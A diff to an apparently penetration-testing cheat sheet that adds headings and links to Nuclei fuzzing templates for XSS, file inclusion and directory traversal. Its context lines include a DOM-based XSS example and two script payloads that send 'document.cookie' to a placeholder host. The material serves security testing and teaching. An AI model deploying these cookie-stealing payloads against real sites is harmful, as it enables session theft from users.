@@ -243,7 +243,7 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 ->  
 `alert(1)`
 
-Dom Based
+#### Dom Based
   
 ```
 <script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
@@ -276,6 +276,9 @@ https://malwaredecoder.com/
 <script>document.location="http://ip/?cookie="+document.cookie;</script>  
 <script>fetch('http://ip/?cookie=' + btoa(document.cookie));</script>
 ```
+
+### Template - Nuclei
+https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
 
 ## Type Juggling and Hash Collision
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
@@ -668,6 +671,9 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/word
 -> poisoning.txt  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
 
+### Template LFI and directory traversal - Nuclei
+https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
+https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml
 
 ## Path Normalization
 https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
